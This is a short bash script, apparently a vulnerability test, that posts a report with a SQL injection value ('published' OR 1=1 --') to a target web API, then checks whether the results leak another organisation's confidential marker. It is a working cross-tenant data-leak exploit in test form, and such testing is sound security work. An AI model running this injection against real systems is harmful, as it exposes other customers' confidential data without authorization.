#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
payload=$(python3 - <<'PY'
import json
print(json.dumps({"org":"acme","name":"published' OR 1=1 --"}))
PY
)
resp=$(curl -s -X POST "$TARGET/api/reports" -H 'content-type: application/json' -d "$payload")
rid=$(printf '%s' "$resp" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("id", ""))')
[ -n "$rid" ]
curl -s "$TARGET/api/reports/$rid/results" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
